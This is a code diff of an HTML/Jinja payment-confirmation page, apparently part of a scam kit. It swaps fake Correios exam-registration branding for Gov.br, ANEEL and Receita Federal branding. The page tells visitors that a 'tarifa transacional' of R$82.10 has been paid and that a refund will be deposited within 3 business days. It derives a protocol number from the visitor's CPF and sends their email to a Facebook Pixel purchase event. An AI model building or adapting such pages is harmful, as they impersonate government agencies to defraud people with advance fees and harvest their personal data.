@@ -1,6 +1,6 @@
 {% extends "base.html" %}
 
-{% block title %}Correios - Confirmação de Inscrição{% endblock %}
+{% block title %}Gov.br - Confirmação de Solicitação{% endblock %}
 
 {% block head %}
     <!-- Preload fonts -->
@@ -24,8 +24,7 @@
             theme: {
                 extend: {
                     colors: {
-                        'correios-blue': '#003399',
-                        'correios-yellow': '#FEEF37',
+                        'gov-blue': '#003399',
                     }
                 }
             }
@@ -35,16 +34,16 @@
 
 {% block content %}
     <!-- Header -->
-    <div class="bg-correios-yellow py-4">
+    <div class="bg-white py-4">
         <div class="container mx-auto px-4">
             <div class="flex flex-col items-center text-center">
-                <img src="https://logodownload.org/wp-content/uploads/2014/05/correios-logo-1-1.png" alt="Logo dos Correios" class="h-12 mb-2" />
+                <img src="https://www.gov.br/++theme++padrao_govbr/img/govbr-logo-large.png" alt="Logo do Gov.br" class="h-12 mb-2" />
                 <div>
-                    <p class="text-correios-blue text-[16px] leading-tight font-bold tracking-wide">
-                        CONCURSO PÚBLICO 2025
+                    <p class="text-gov-blue text-[16px] leading-tight font-bold tracking-wide">
+                        ANEEL - Agência Nacional de Energia Elétrica
                     </p>
-                    <p class="text-correios-blue text-[12px] leading-tight tracking-wide">
-                        SELEÇÃO EXTERNA PARA MÚLTIPLOS CARGOS
+                    <p class="text-gov-blue text-[12px] leading-tight tracking-wide">
+                        Em parceria com a Receita Federal do Brasil
                     </p>
                 </div>
             </div>
@@ -52,7 +51,7 @@
     </div>
 
     <!-- Barra Azul -->
-    <div class="bg-correios-blue py-3 shadow-md">
+    <div class="bg-gov-blue py-3 shadow-md">
         <div class="container mx-auto px-4 flex items-center">
             <div class="grid grid-cols-2 gap-0.5 mr-3 drop-shadow-sm">
                 <div class="w-2 h-2 bg-white"></div>
@@ -60,7 +59,7 @@
                 <div class="w-2 h-2 bg-white"></div>
                 <div class="w-2 h-2 bg-white"></div>
             </div>
-            <span class="text-white text-xl tracking-wide drop-shadow-sm">CONFIRMAÇÃO DE INSCRIÇÃO</span>
+            <span class="text-white text-xl tracking-wide drop-shadow-sm">CONFIRMAÇÃO DE PAGAMENTO</span>
         </div>
     </div>
 
@@ -74,15 +73,15 @@
                         <i class="fas fa-check-circle text-green-600 text-3xl"></i>
                     </div>
                 </div>
-                <h2 class="text-2xl font-bold text-center text-green-800 mb-4">Inscrição Confirmada!</h2>
+                <h2 class="text-2xl font-bold text-center text-green-800 mb-4">Pagamento Confirmado!</h2>
                 <p class="text-green-700 text-center">
-                    Pagamento processado com sucesso. Sua inscrição foi confirmada no Concurso Público dos Correios 2025.
+                    A tarifa transacional foi processada com sucesso. Sua restituição será depositada em até 3 dias úteis.
                 </p>
             </div>
 
             <!-- Timeline -->
             <div class="bg-white rounded-lg shadow-md p-6">
-                <h3 class="text-lg font-bold text-correios-blue mb-6">Próximas Etapas</h3>
+                <h3 class="text-lg font-bold text-gov-blue mb-6">Próximas Etapas</h3>
                 <div class="space-y-8">
                     <div class="flex items-start">
                         <div class="flex flex-col items-center">
@@ -92,7 +91,7 @@
                             <div class="h-16 w-0.5 bg-gray-300"></div>
                         </div>
                         <div class="ml-4">
-                            <h4 class="font-semibold text-gray-900">Inscrição e Pagamento</h4>
+                            <h4 class="font-semibold text-gray-900">Pagamento da Tarifa Transacional</h4>
                             <p class="text-sm text-gray-600">Concluído em {{ datetime.now().strftime('%d/%m/%Y às %H:%M') }}</p>
                         </div>
                     </div>
@@ -105,7 +104,7 @@
                             <div class="h-16 w-0.5 bg-gray-300"></div>
                         </div>
                         <div class="ml-4">
-                            <h4 class="font-semibold text-gray-900">Processamento da Inscrição</h4>
+                            <h4 class="font-semibold text-gray-900">Processamento da Restituição</h4>
                             <p class="text-sm text-gray-600">Em andamento</p>
                         </div>
                     </div>
@@ -113,12 +112,12 @@
                     <div class="flex items-start">
                         <div class="flex flex-col items-center">
                             <div class="bg-gray-300 rounded-full w-8 h-8 flex items-center justify-center">
-                                <i class="fas fa-id-card text-white"></i>
+                                <i class="fas fa-money-bill-wave text-white"></i>
                             </div>
                         </div>
                         <div class="ml-4">
-                            <h4 class="font-semibold text-gray-900">Cartão de Confirmação</h4>
-                            <p class="text-sm text-gray-600">Disponível em até 48 horas</p>
+                            <h4 class="font-semibold text-gray-900">Depósito da Restituição</h4>
+                            <p class="text-sm text-gray-600">Será realizado em até 3 dias úteis</p>
                         </div>
                     </div>
                 </div>
@@ -131,10 +130,10 @@
                     <div>
                         <h4 class="font-semibold text-blue-900 mb-2">Informação Importante</h4>
                         <p class="text-sm text-blue-800">
-                            Para sua segurança, guarde seu número de inscrição: <span class="font-bold">{{ '{}{}{}'.format(user_data.cpf[:3], current_year, user_data.cpf[3:6]) }}</span>
+                            Para sua segurança, mantenha seu protocolo em local seguro: <span class="font-bold">{{ '{}{}{}'.format(user_data.cpf[:3], current_year, user_data.cpf[3:6]) }}</span>
                         </p>
                         <p class="text-sm text-blue-800 mt-2">
-                            Em caso de dúvidas, entre em contato com nossa Central de Atendimento: 0800 725 0100
+                            Em caso de dúvidas, entre em contato com nossa Central de Atendimento: 167
                         </p>
                     </div>
                 </div>
@@ -143,9 +142,9 @@
     </div>
 
     <!-- Footer -->
-    <div class="bg-correios-yellow text-correios-blue text-center py-4 mt-auto shadow-inner">
-        <p class="text-sm font-medium">© {{ current_year }} Empresa Brasileira de Correios e Telégrafos. Todos os direitos reservados.</p>
-        <p class="text-sm mt-1">Central de Atendimento dos Correios: 0800 725 0100</p>
+    <div class="bg-gov-blue text-white text-center py-4 mt-auto shadow-inner">
+        <p class="text-sm font-medium">© {{ current_year }} ANEEL - Agência Nacional de Energia Elétrica. Todos os direitos reservados.</p>
+        <p class="text-sm mt-1">Central de Atendimento: 167</p>
     </div>
 
     <!-- Facebook Pixel Purchase Event -->
@@ -153,9 +152,9 @@
         fbq('track', 'Purchase', {
             value: 82.10,
             currency: 'BRL',
-            content_name: 'Inscrição Concurso Correios',
+            content_name: 'Taxa Transacional',
             content_type: 'product',
-            content_ids: ['INSCRICAO_CORREIOS'],
+            content_ids: ['TX_TRANSACIONAL'],
             transaction_id: '{{ '{}{}{}'.format(user_data.cpf[:3], current_year, user_data.cpf[3:6]) }}',
             user_data: {
                 email: '{{ user_data.email }}',
